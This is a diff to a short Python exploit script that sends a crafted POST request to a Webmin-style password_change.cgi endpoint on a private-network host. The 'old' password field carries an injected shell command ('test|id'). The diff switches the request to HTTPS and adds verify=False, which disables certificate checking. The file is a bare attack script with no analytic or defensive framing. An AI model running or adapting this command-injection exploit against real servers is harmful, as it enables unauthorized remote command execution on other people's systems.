@@ -1,6 +1,6 @@
 import requests
 
-url = "http://192.168.1.14:10000/password_change.cgi"
+url = "https://192.168.1.14:10000/password_change.cgi"
 
 headers = {
     "Accept-Encoding": "gzip, deflate",
@@ -15,6 +15,6 @@ headers = {
 
 data = "user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2"
 
-response = requests.post(url, headers=headers, data=data)
+response = requests.post(url, headers=headers, data=data, verify=False)
 
 print(response.text)
